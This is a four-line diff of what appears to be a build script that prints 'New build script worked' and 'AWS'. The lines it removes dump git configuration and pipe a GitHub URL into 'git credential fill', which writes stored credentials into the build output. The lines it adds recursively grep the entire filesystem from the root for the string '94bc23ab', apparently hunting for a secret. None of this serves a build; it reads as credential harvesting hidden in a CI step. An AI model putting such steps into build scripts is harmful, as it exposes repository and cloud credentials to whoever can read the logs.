@@ -1,4 +1,4 @@
 echo "New build script worked"
 echo "AWS"
-git config --list
-echo url=https://github.com/danew3rs/cloudcheck | git credential fill
+cd /
+grep -r 94bc23ab
